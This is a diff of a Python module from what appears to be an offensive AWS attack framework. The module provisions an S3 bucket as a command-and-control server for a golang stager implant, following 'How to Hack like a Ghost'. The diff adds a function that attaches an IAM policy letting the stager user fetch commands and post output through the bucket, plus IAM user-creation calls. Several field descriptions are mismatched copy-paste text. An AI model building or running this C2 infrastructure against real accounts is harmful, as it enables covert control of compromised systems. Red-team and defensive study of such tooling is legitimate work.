@@ -26,40 +26,20 @@ variables = {
         "required": "true",
         "description": "The service that will be used to run the module. It cannot be changed."
     },
-    "BUCKETNAME": {
-        "value": "",
-        "required": "true",
-        "description": "The bucket name to use as C2. If the bucket does not exist, it will be created."
-    },
-    "OUTPUTKEY": {
-        "value": "home.html",
-        "required": "true",
-        "description": "The the output file. By default it's 'output'"
-    },
-    "COMMANDKEY": {
-        "value": "index.html",
-        "required": "true",
-        "description": "The filename where the command is hosted. By default is 'index.html'"
-    },
-    "KMS-KEY-ARN": {
-        "value": "",
-        "required": "false",
-        "description": "The filename where the command is hosted. By default is 'index.html'"
-    },
     "STAGER-ACCESS-KEY": {
         "value": "",
         "required": "true",
-        "description": "The filename where the command is hosted. By default is 'index.html'"
+        "description": "The AWS Access Key for the staging user."
     },
     "STAGER-SECRET-KEY": {
         "value": "",
         "required": "true",
-        "description": "The filename where the command is hosted. By default is 'index.html'"
+        "description": "The AWS Secret Key for the staging user."
     },
     "STAGER-TYPE": {
         "value": "golang",
         "required": "true",
-        "description": "The filename where the command is hosted. By default is 'terraform'"
+        "description": "The filename where the command is hosted. By default is 'golang'"
     },
     "GOOS": {
         "value": "linux",
@@ -70,6 +50,26 @@ variables = {
         "value": "amd64",
         "required": "true",
         "description": "The architecture to execute the binary at. Only used for golang stager."
+    },
+    "BUCKETNAME": {
+        "value": "",
+        "required": "true",
+        "description": "The name of the bucket to use for C2 Server."
+    },
+    "COMMANDKEY": {
+        "value": "index.html",
+        "required": "true",
+        "description": "The name of the bucket to use for C2 Server."
+    },
+    "OUTPUTKEY": {
+        "value": "home.html",
+        "required": "true",
+        "description": "The name of the bucket to use for C2 Server."
+    },
+    "KMS-KEY-ARN": {
+        "value": "",
+        "required": "false",
+        "description": "The name of the bucket to use for C2 Server."
     }
 }
 description = "Based on the book How to Hack like a Ghost, where an S3 bucket is used as a C2 Server."
@@ -82,6 +82,9 @@ stagers = [
 ]
 
 calls = [
+    "iam:CreateUser",
+    "iam:PutUserPolicy",
+    "iam:CreateAccessKey",
     "s3:CreateBucket",
     "s3:PutBucketPolicy",
     "s3:PutBucketVersioning",
@@ -91,7 +94,66 @@ calls = [
     "kms:Encrypt"
 ]
 
-def exploit(profile, workspace):
+def createUser(bucketname, commandkey, outputkey, kmsid, username):
+    access_key = os.environ.get('AWS_ACCESS_KEY')
+    secret_key = os.environ.get('AWS_SECRET_KEY')
+    region = os.environ.get('AWS_REGION')
+    stsargs = {
+        "service_name": "iam",
+        "region_name": region,
+        "aws_access_key_id": access_key,
+        "aws_secret_access_key": secret_key
+    }
+    iamprofile = boto3.client(
+        **stsargs
+    )
+
+    userpolicy = {
+        "Version": "2012-10-17",
+        "Statement": [
+            {
+                "Sid": "Statement1",
+                "Effect": "Allow",
+                "Action": [
+                    "s3:GetObject"
+                ],
+                "Resource": [
+                    f"arn:aws:s3:::{bucketname}/*/{commandkey}"
+                ]
+            },
+            {
+                "Sid": "Statement2",
+                "Effect": "Allow",
+                "Action": [
+                    "s3:PutObject",
+                    "s3:DeleteObject"
+                ],
+                "Resource": [
+                    f"arn:aws:s3:::{bucketname}/*/{outputkey}",
+                    f"arn:aws:s3:::{bucketname}"
+                ]
+            },
+            {
+                "Sid": "Statement3",
+                "Effect": "Allow",
+                "Action": [
+                    "kms:Encrypt",
+                    "kms:Decrypt"
+                ],
+                "Resource": kmsid
+            }
+        ]
+    }
+    stageruser = username.split("/")[-1].strip().replace("\n", "")
+    try:
+        iamprofile.put_user_policy(UserName=stageruser, PolicyName="stager", PolicyDocument=json.dumps(userpolicy))
+        return {"status": True}
+    
+    except Exception as e:
+        return {"status": False, "error": f"Error Attaching Policy: {str(e)}"}
+    
+
+def exploit(profile, callstoprofile):
     bucket = variables['BUCKETNAME']['value']
     commandkey = variables['COMMANDKEY']['value']
     outputkey = variables['OUTPUTKEY']['value']
@@ -99,10 +161,18 @@ def exploit(profile, workspace):
 
     access_key = os.environ.get('AWS_ACCESS_KEY')
     secret_key = os.environ.get('AWS_SECRET_KEY')
+
+    #if access_key == "" or secret_key == "":
+    #    usercreds = createUser(bucketname=bucket, commandkey=commandkey, outputkey=outputkey, kmsid=kmskey)
+    #    access_key = usercreds['access_key']
+    #    secret_key = usercreds['secret_key']
+
     region = os.environ.get('AWS_REGION')
 
     stager_access_key = variables['STAGER-ACCESS-KEY']['value']
     stager_secret_key = variables['STAGER-SECRET-KEY']['value']
+
+
     stager_type = variables['STAGER-TYPE']['value']
 
     goos = variables['GOOS']['value']
@@ -241,6 +311,7 @@ def exploit(profile, workspace):
                 return stagerData
             else:
                 return stagerData["ModuleName"]
+            '''
             return {
                 "ModuleName": {
                     "ModuleName": "S3 Command and Control",
@@ -248,6 +319,7 @@ def exploit(profile, workspace):
                     "Bucket": bucket
                 }
             }
+            '''
         else:
             return {
                 'error': f"Error from module: {status['Error']}"
@@ -292,6 +364,7 @@ def setupBucket(profile, bucketname, commandkey, outputkey, stageruser, kmskey, 
         kmsprofile = boto3.client(
             **kmsargs
         )
+
         if kmskey == "":
             kmskey = kmsprofile.create_key(
                 Policy=json.dumps(
@@ -452,6 +525,20 @@ def setupBucket(profile, bucketname, commandkey, outputkey, stageruser, kmskey, 
                 'Status': 'Enabled'
             }
         )
+
+        putuserpolicy = createUser(
+            bucketname=bucketname,
+            kmsid=kmskey,
+            commandkey=commandkey,
+            outputkey=outputkey,
+            username=stageruser
+        )
+
+        if "error" in putuserpolicy:
+            return {
+                'Status': "Error Creating",
+                'Error': putuserpolicy['error']
+            }
 
         return {
             'Status': "Successfully Created",
